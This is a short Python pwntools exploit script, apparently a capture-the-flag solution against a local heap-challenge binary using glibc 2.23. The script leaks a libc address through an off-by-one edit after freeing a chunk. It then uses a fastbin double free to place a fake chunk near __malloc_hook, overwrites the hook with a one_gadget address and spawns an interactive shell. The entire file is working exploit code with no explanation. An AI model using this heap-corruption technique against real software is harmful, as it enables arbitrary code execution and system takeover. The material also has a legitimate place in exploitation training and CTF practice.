#!/usr/bin/env python3
from pwn import *
elf = context.binary = ELF("./program")
p = process("./program")
libc = ELF("libc-2.23.so")
gdb.attach(p,"init-pwndbg")

def new_string(length,data):
    p.sendlineafter("choice: ","1")
    p.sendlineafter("please input string length: ",str(length))
    p.sendlineafter("please input the string content: ",data)

def delete_string(index):
    p.sendlineafter("choice: ","4")
    p.sendlineafter("please input the index: ",str(index))

def edit_string(index,byte_index):
    p.sendlineafter("choice: ","3")
    p.sendlineafter("please input the index: ",str(index))
    p.sendlineafter("input the byte index: ",str(byte_index))

new_string(40,'a'*8)
new_string(0x88,'b'*8)
new_string(40,'c'*8)
delete_string(1)
edit_string(0,40)
new_string(0x88,'c'*8)
p.recvline()
leak = p.recvline()[:-1]
leak = b'\x00'+leak
leak = leak.ljust(8,b'\x00')
leak = u64(leak)
libc.address = leak - 0x399b00
log.critical("Libc base address: {}".format(hex(libc.address)))
__malloc_hook = libc.sym.__malloc_hook
fake_fast = __malloc_hook - 35
new_string(0x68,'d'*8)
new_string(0x68,'e'*8)
delete_string(4)
delete_string(5)
delete_string(4)
new_string(0x68,p64(fake_fast))
new_string(0x68,'0'*8)
new_string(0x68,'1'*8)
one_gadget = libc.address + 0xd6701
payload = b'a'*19 + p64(one_gadget)
new_string(0x68,payload)
p.sendline("1")
p.sendline("1")
p.interactive()